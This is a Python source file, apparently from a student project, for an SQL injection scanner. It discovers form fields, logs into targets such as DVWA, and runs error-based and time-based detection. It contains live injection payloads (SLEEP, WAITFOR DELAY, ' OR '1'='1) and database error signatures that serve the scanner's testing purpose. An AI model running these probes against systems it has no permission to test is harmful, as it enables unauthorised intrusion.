"""
SQL injection detection. Does passive error pattern first, then active time based.

Field discovery: discover_fields() fetches the target page and parses the
<form> elements for their input/select/textarea names, plus any query-string
parameters already in the URL, recording each field's submission method (GET or
POST) and action URL. The scan route feeds these into detection so the user no
longer has to type parameter names by hand (manual entry is kept as a fallback).

Submission method: detection can submit a field's payload by GET or POST (pass
`method`), so form fields that post - such as DVWA's Medium SQLi page - can be
tested too, not just GET parameters. When it fuzzes one field it resubmits the
rest of that field's form (the Submit button, hidden tokens, other inputs - the
`siblings` discover_fields records), because an app that only runs its query
when the Submit button is present (DVWA Medium/High) otherwise returns no result
and the field wrongly reads CLEAN.

So far I've done 2 of the 3 techniques from the proposal:

  1. run_passive_detection() - looks for SQL error messages in the response
     (the simplest one).
  2. run_active_time_based_detection() - timing based, only runs if passive
     didn't find anything. Uses an adaptive baseline (see calibrate_baseline).

Boolean based blind is NOT done yet, that's next.

How the time based part works (same as the Activity Diagram): first measure
how long the target normally takes to respond (calibrate_baseline), then send
a payload that makes the DB sleep and see if the response is a lot slower than
normal. Network lag can cause false positives so the delay has to happen on
every repeat. If it only happens on some of them it's marked
POSSIBLY_VULNERABLE instead of confirmed.

Authentication: the scanner can log in to the target itself - give it the
login URL, username and password and authenticated_cookie_header() fetches the
login page, resends any hidden anti-CSRF token (e.g. DVWA's user_token),
submits the credentials in a persistent session and hands back the resulting
cookies for the scan. Pasting a cookie copied from devtools still works as an
advanced fallback. The scan route remembers the resulting cookie per target site
(see scan/target_sessions.py) and session_still_valid() checks it hasn't
expired before it is reused, so the user logs in once per site, not per scan.
"""
import json
import statistics
import time
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse, parse_qsl

import requests


def serialize_fields(fields):
    """Store the discovered/entered fields on ScanTarget.parameters as JSON."""
    return json.dumps({"fields": fields})


def load_scan_fields(parameters_value, url=None):
    """Read fields back from ScanTarget.parameters.

    Handles the JSON written by serialize_fields(), and also falls back to the
    old comma-separated format so scans saved before field discovery still
    open. Returns a list of {name, method, action_url} dicts."""
    if not parameters_value:
        return []
    try:
        data = json.loads(parameters_value)
        fields = data.get("fields", [])
        if isinstance(fields, list):
            return [
                {
                    "name": f.get("name"),
                    "method": "POST" if f.get("method") == "POST" else "GET",
                    "action_url": f.get("action_url") or url,
                    "siblings": f.get("siblings") or {},
                }
                for f in fields if f.get("name")
            ]
    except (ValueError, AttributeError):
        pass
    # legacy: a plain comma-separated list of GET parameter names
    return [
        {"name": name.strip(), "method": "GET", "action_url": url, "siblings": {}}
        for name in str(parameters_value).split(",") if name.strip()
    ]


def field_method_for(parameters_value, param_name, url=None):
    """Return the submission method (GET/POST) recorded for one field."""
    for f in load_scan_fields(parameters_value, url=url):
        if f["name"] == param_name:
            return f["method"]
    return "GET"


def siblings_for(parameters_value, param_name, url=None):
    """Return the stored sibling fields (form's other fields + defaults) for one
    field, so a later re-test can resubmit the whole form just like the scan did."""
    for f in load_scan_fields(parameters_value, url=url):
        if f["name"] == param_name:
            return f.get("siblings") or {}
    return {}


def siblings_by_param(fields):
    """Map each field name to its sibling fields, for the detection functions."""
    return {f["name"]: (f.get("siblings") or {}) for f in fields}


# input types that submit the form rather than carry a value we'd want to test
_NON_VALUE_INPUT_TYPES = {"submit", "button", "image", "reset"}


class _FormParser(HTMLParser):
    """Pulls <form> elements out of a page with their method, action and every
    <input>/<select>/<textarea> inside them (name, value and type).

    We keep the submit button and hidden fields as well as the value-carrying
    ones, because to test a field we have to resubmit the rest of its form -
    DVWA (and most apps) only run the query when the Submit button is present,
    so dropping it makes a real POST form look CLEAN. Which fields are worth
    fuzzing vs. just resent-as-is is sorted out in discover_fields().

    Uses the stdlib html.parser so we don't take on another dependency. It's a
    forgiving parser, which suits scraping real-world markup. Fields that sit
    outside any <form> are ignored on purpose (the roadmap scopes discovery to
    form fields plus the URL's own query string)."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self._current = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._current = {
                "method": (a.get("method") or "GET").strip().upper() or "GET",
                "action": a.get("action") or "",
                "inputs": [],
            }
        elif tag in ("input", "select", "textarea") and self._current is not None:
            name = a.get("name")
            if name:
                self._current["inputs"].append({
                    "name": name,
                    "value": a.get("value") or "",
                    "type": (a.get("type") or "text").strip().lower(),
                })

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None

    def close(self):
        super().close()
        # a <form> missing its closing tag still counts
        if self._current is not None:
            self.forms.append(self._current)
            self._current = None


class _LoginFormParser(HTMLParser):
    """Finds the login form (the <form> that contains a password input) and
    records its action, method, and every input's name/value/type - we need
    the values so hidden anti-CSRF tokens (e.g. DVWA's user_token) are resent."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self._forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {
                "action": a.get("action") or "",
                "method": (a.get("method") or "GET").strip().upper() or "GET",
                "inputs": [],
            }
        elif tag in ("input", "select", "textarea") and self._cur is not None:
            self._cur["inputs"].append({
                "name": a.get("name"),
                "value": a.get("value") or "",
                "type": (a.get("type") or "text").strip().lower(),
            })

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self._forms.append(self._cur)
            self._cur = None

    def close(self):
        super().close()
        if self._cur is not None:
            self._forms.append(self._cur)
            self._cur = None

    def login_form(self):
        for f in self._forms:
            if any(i["type"] == "password" for i in f["inputs"]):
                return f
        return self._forms[0] if self._forms else None


def _cookie_header_from(cookies_dict):
    return "; ".join(f"{k}={v}" for k, v in cookies_dict.items())


def _parse_cookie_header(cookie_header):
    out = {}
    for part in (cookie_header or "").split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out


def authenticated_cookie_header(login_url, username, password, extra_cookie=None, timeout=10):
    """Log in with a username and password and return (cookie_header, error).

    Removes the devtools cookie-pasting step (item 7): fetch the login page,
    read its form (including hidden fields such as DVWA's per-request
    user_token), submit the credentials in a persistent session, confirm the
    login landed off the login page, then hand back the session's cookies as a
    Cookie header the rest of the scanner already knows how to use.

    `extra_cookie` (anything still pasted into the cookie field) is merged in
    and wins over the session's own values, so a user can set DVWA's security
    level. For convenience we default DVWA's `security` cookie to `low` when the
    login didn't set one, since that's the documented test level; a non-DVWA
    target simply ignores an unknown cookie, and pasting your own overrides it.
    On failure `error` is a plain-language message and `cookie_header` is None."""
    session = requests.Session()
    try:
        resp = session.get(login_url, timeout=timeout)
    except requests.RequestException as exc:
        return None, f"Couldn't reach the login page - check the login URL ({exc})."

    parser = _LoginFormParser()
    try:
        parser.feed(resp.text)
        parser.close()
    except Exception:
        pass
    form = parser.login_form()
    if form is None:
        return None, "Couldn't find a login form at that URL."

    data = {}
    user_field = pass_field = None
    for i in form["inputs"]:
        name = i["name"]
        if not name:
            continue
        if i["type"] == "password" and pass_field is None:
            pass_field = name
        elif i["type"] in ("text", "email") and user_field is None:
            user_field = name
        else:
            data[name] = i["value"]  # hidden fields / tokens keep their value
    if user_field is None or pass_field is None:
        return None, "That login form doesn't have the expected username and password fields."
    data[user_field] = username
    data[pass_field] = password

    action_url = urljoin(login_url, form["action"]) if form["action"] else login_url
    try:
        if form["method"] == "POST":
            login_resp = session.post(action_url, data=data, timeout=timeout)
        else:
            login_resp = session.get(action_url, params=data, timeout=timeout)
    except requests.RequestException as exc:
        return None, f"Couldn't submit the login form ({exc})."

    body = login_resp.text.lower()
    failed_markers = ["login failed", "password incorrect", "invalid credentials",
                      "incorrect username", "authentication failed"]
    if any(m in body for m in failed_markers):
        return None, "Login failed - check the username and password."

    # if the page we land on still shows a login form and the URL still looks
    # like a login page, we probably didn't get in
    landing = _LoginFormParser()
    try:
        landing.feed(login_resp.text)
        landing.close()
    except Exception:
        pass
    if landing.login_form() is not None and "login" in login_resp.url.lower():
        return None, "Login didn't go through - the login page is still showing."

    cookies = session.cookies.get_dict()
    if "security" not in cookies:
        cookies["security"] = "low"  # DVWA convenience (see docstring)
    cookies.update(_parse_cookie_header(extra_cookie))  # pasted cookie wins

    if not cookies:
        return None, "Login produced no session cookie, so it may not have worked."
    return _cookie_header_from(cookies), None


def session_still_valid(url, cookie_header, timeout=6):
    """Check a saved target session still works before reusing it.

    Fetches `url` with the cookie; if the target bounces us to a page that shows
    a login form and has 'login' in its URL (what DVWA does once PHPSESSID
    expires), the session is treated as expired. An unreachable target counts
    as valid here so the scan itself reports the real connection error."""
    try:
        resp = requests.get(url, headers={"Cookie": cookie_header}, timeout=timeout)
    except requests.RequestException:
        return True
    parser = _LoginFormParser()
    try:
        parser.feed(resp.text)
        parser.close()
    except Exception:
        pass
    return not (parser.login_form() is not None and "login" in resp.url.lower())


def discover_fields(url, cookie_header=None, timeout=6):
    """Fetch the target page and work out what input fields it has.

    Returns a dict:
      {
        "fields":  [ {name, method, action_url}, ... ]  one per discovered field,
        "error":   None, or a plain-language message if the page couldn't be read.
      }

    Each field carries the method (GET/POST), the action URL of the form it came
    from, and `siblings`: the form's other fields with a default value each (the
    Submit button, hidden tokens, other inputs), so the scanner can resubmit the
    whole form when it fuzzes one field. Query-string parameters already present
    in the URL are included as GET fields against the URL itself. Names are
    de-duplicated, keeping the first form a name appears in."""
    headers = {"Cookie": cookie_header} if cookie_header else {}

    # query-string parameters are discoverable without fetching anything
    query_params = [name for name, _value in parse_qsl(urlparse(url).query)]

    fields = []
    seen = set()

    def _add(name, method, action_url, siblings=None):
        if name and name not in seen:
            seen.add(name)
            fields.append({"name": name, "method": method, "action_url": action_url,
                           "siblings": siblings or {}})

    try:
        resp = requests.get(url, headers=headers, timeout=timeout)
    except requests.RequestException as exc:
        # couldn't reach the page; still return any query-string params so a
        # scan can go ahead on those alone
        for name in query_params:
            _add(name, "GET", url)
        return {"fields": fields, "error": f"Couldn't fetch the page to discover fields ({exc})."}

    parser = _FormParser()
    try:
        parser.feed(resp.text)
        parser.close()
    except Exception:
        # a parsing blow-up shouldn't sink the whole scan
        parser.forms = getattr(parser, "forms", [])

    for form in parser.forms:
        action_url = urljoin(url, form["action"]) if form["action"] else url
        method = "POST" if form["method"] == "POST" else "GET"

        # a default value for every named input, so the form can be resubmitted
        # whole: keep a real value where the markup gives one, otherwise send a
        # harmless "1" (and "Submit" for a submit button, which apps check for).
        defaults = {}
        testable = []
        for inp in form["inputs"]:
            name = inp["name"]
            if inp["value"]:
                defaults[name] = inp["value"]
            elif inp["type"] in _NON_VALUE_INPUT_TYPES:
                defaults[name] = "Submit"
            else:
                defaults[name] = "1"
            # don't fuzz the submit/button itself, but every value-carrying
            # field (including hidden ones) is a candidate to test
            if inp["type"] not in _NON_VALUE_INPUT_TYPES and name not in testable:
                testable.append(name)

        for name in testable:
            siblings = {k: v for k, v in defaults.items() if k != name}
            _add(name, method, action_url, siblings)

    # query-string params last, so a name that also appears in a form keeps the
    # form's method/action
    for name in query_params:
        _add(name, "GET", url)

    return {"fields": fields, "error": None}

# settings for the time based detection
DELAY_SECONDS = 5          # how many seconds the payload makes the DB sleep
ACTIVE_REPEATS = 3         # how many times to repeat to make sure the delay is consistent
# a response is "delayed" if it's slower than the baseline mean + 3 standard
# deviations + a fixed margin (in ms). The margin is less than DELAY_SECONDS so
# a real 5s sleep still gets past it, but normal lag (a few hundred ms) won't.
BASELINE_STDDEV_MULTIPLIER = 3
DELAY_MARGIN_MS = 4000
# has to be bigger than DELAY_SECONDS or the request times out before the sleep finishes
ACTIVE_TIMEOUT = DELAY_SECONDS + 15

# payloads that cause a delay. {d} gets replaced with DELAY_SECONDS.
# SLEEP() is for MySQL/MariaDB (which DVWA uses), WAITFOR is for SQL Server
TIME_PAYLOAD_TEMPLATES = [
    "' AND SLEEP({d})-- -",
    "' OR SLEEP({d})-- -",
    "1' AND SLEEP({d})-- -",
    "'; WAITFOR DELAY '0:0:{d}'-- -",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite3.operationalerror",
    "pg_query():",
    "sqlstate[",
    "mysql_fetch",
    "odbc drivers error",
]

PROBE_PAYLOADS = [
    "'",
    "''",
    "\"",
    "' OR '1'='1",
    "' OR SLEEP(0)-- -",   # SLEEP(0) so it doesn't actually delay anything, keeps it passive
    "1' ORDER BY 100-- -",
]


def _send(url, param, payload, headers, timeout, method, extra=None):
    """Send one probe for `param`=`payload`, by GET or POST, and return the
    response. POST support (item 2) lets the scanner reach form fields that
    are submitted by POST, such as DVWA's Medium SQLi page.

    `extra` is the field's sibling form fields (Submit button, hidden tokens,
    other inputs). They are sent alongside the payload so the whole form is
    resubmitted - without them an app that gates on its Submit button (DVWA
    Medium/High) never runs the query and the field wrongly looks CLEAN. The
    tested `param` always overrides any same-named value in `extra`."""
    data = dict(extra or {})
    data[param] = payload
    if method == "POST":
        return requests.post(url, data=data, headers=headers, timeout=timeout)
    return requests.get(url, params=data, headers=headers, timeout=timeout)


def run_passive_detection(url, param_names, cookie_header=None, timeout=6, method="GET",
                          siblings=None):
    """
    Returns a list of dicts like this:
      {parameter_name, detection_method, payload_used, finding_classification}
    There's one dict for each parameter. It stops at the first payload that
    triggers an error so that one is what gets saved. `method` is GET or POST
    and decides how each field's payload is submitted. `siblings` maps a param
    name to its form's other fields, resubmitted with each probe (see _send).
    """
    headers = {"Cookie": cookie_header} if cookie_header else {}
    method = "POST" if method == "POST" else "GET"
    siblings = siblings or {}
    results = []

    for param in param_names:
        classification = "CLEAN"
        triggering_payload = None
        extra = siblings.get(param, {})

        for payload in PROBE_PAYLOADS:
            try:
                resp = _send(url, param, payload, headers, timeout, method, extra)
            except requests.RequestException as exc:
                # couldn't reach the target. Mark it as SCAN_ERROR so it
                # doesn't wrongly show up as CLEAN
                classification = "SCAN_ERROR"
                triggering_payload = f"(request failed: {exc})"
                break

            body_lower = resp.text.lower()
            if any(sig in body_lower for sig in ERROR_SIGNATURES):
                classification = "CONFIRMED_VULNERABLE"
                triggering_payload = payload
                break  # found it, no point trying the other payloads

        results.append({
            "parameter_name": param,
            "detection_method": "PASSIVE_ERROR_PATTERN",
            "payload_used": triggering_payload,
            "finding_classification": classification,
        })

    return results


def _elapsed_ms(url, param, payload, headers, timeout, method="GET", extra=None):
    """Sends one request and returns (elapsed_ms, timed_out, error).

    If it times out I count that as delayed, not as a failure, because a
    SLEEP() payload that works can make the request go past the timeout.
    Any other error (like the host being down) gets returned as `error`.
    `extra` is the field's sibling form fields, resubmitted with it (see _send).
    """
    start = time.monotonic()
    try:
        _send(url, param, payload, headers, timeout, "POST" if method == "POST" else "GET", extra)
    except requests.Timeout:
        return (timeout * 1000.0, True, None)
    except requests.RequestException as exc:
        return (None, False, exc)
    return ((time.monotonic() - start) * 1000.0, False, None)


def calibrate_baseline(url, param, cookie_header=None, samples=5, timeout=10, method="GET",
                       extra=None):
    """Measures how long the target normally takes to respond.

    Sends a few normal requests (just the value "1", no injection) and returns
    {mean_response_ms, stddev_response_ms, sample_count}. Returns None if all
    of them failed (target is down). This is the "adaptive" part, the threshold
    comes from timing this target instead of using a hardcoded number.

    `extra` is the field's sibling form fields, sent with the baseline requests
    too, so the baseline times the same code path the payloads will hit (for a
    Submit-gated form, the path that actually runs the query)."""
    headers = {"Cookie": cookie_header} if cookie_header else {}
    timings = []
    for _ in range(samples):
        elapsed, _timed_out, error = _elapsed_ms(url, param, "1", headers, timeout, method, extra)
        if error is not None:
            continue
        timings.append(elapsed)

    if not timings:
        return None

    return {
        "mean_response_ms": statistics.mean(timings),
        # using pstdev instead of stdev because stdev crashes if there's only 1 sample
        "stddev_response_ms": statistics.pstdev(timings),
        "sample_count": len(timings),
    }


def run_active_time_based_detection(url, param_names, baseline, cookie_header=None, method="GET",
                                    siblings=None):
    """Time based detection, for the params that passive detection said were CLEAN.

    `baseline` is what calibrate_baseline() returns. For each parameter we send
    a sleep payload and compare the response time to the baseline. It counts
    as "delayed" if it's more than:
        mean + BASELINE_STDDEV_MULTIPLIER * stddev + DELAY_MARGIN_MS

    How each parameter gets classified:
      - all the repeats were delayed       -> CONFIRMED_VULNERABLE
      - only some of them were delayed     -> POSSIBLY_VULNERABLE
      - none were delayed                  -> CLEAN
      - target went down during the test   -> SCAN_ERROR

    Returns a list of dicts in the same format as run_passive_detection().
    """
    headers = {"Cookie": cookie_header} if cookie_header else {}
    siblings = siblings or {}
    threshold_ms = (
        baseline["mean_response_ms"]
        + BASELINE_STDDEV_MULTIPLIER * baseline["stddev_response_ms"]
        + DELAY_MARGIN_MS
    )
    results = []

    for param in param_names:
        classification = "CLEAN"
        triggering_payload = None
        extra = siblings.get(param, {})

        for template in TIME_PAYLOAD_TEMPLATES:
            payload = template.format(d=DELAY_SECONDS)

            # try once first, only do the repeats if this one is slow (saves time)
            elapsed, _timed_out, error = _elapsed_ms(
                url, param, payload, headers, ACTIVE_TIMEOUT, method, extra)
            if error is not None:
                classification = "SCAN_ERROR"
                triggering_payload = f"(request failed: {error})"
                break
            if elapsed <= threshold_ms:
                continue  # no delay, move on to the next payload

            # first one was slow so repeat it to check it wasn't just lag
            delayed_count = 1
            aborted = False
            for _ in range(ACTIVE_REPEATS - 1):
                elapsed, _timed_out, error = _elapsed_ms(
                    url, param, payload, headers, ACTIVE_TIMEOUT, method, extra)
                if error is not None:
                    classification = "SCAN_ERROR"
                    triggering_payload = f"(request failed: {error})"
                    aborted = True
                    break
                if elapsed > threshold_ms:
                    delayed_count += 1
            if aborted:
                break

            if delayed_count == ACTIVE_REPEATS:
                classification = "CONFIRMED_VULNERABLE"
                triggering_payload = payload
                break  # confirmed, don't need to try the other payloads
            else:
                # not consistent, so mark it as possibly vulnerable but keep
                # going in case another payload delays every time
                classification = "POSSIBLY_VULNERABLE"
                triggering_payload = payload

        results.append({
            "parameter_name": param,
            "detection_method": "ACTIVE_TIME_BASED",
            "payload_used": triggering_payload,
            "finding_classification": classification,
        })

    return results
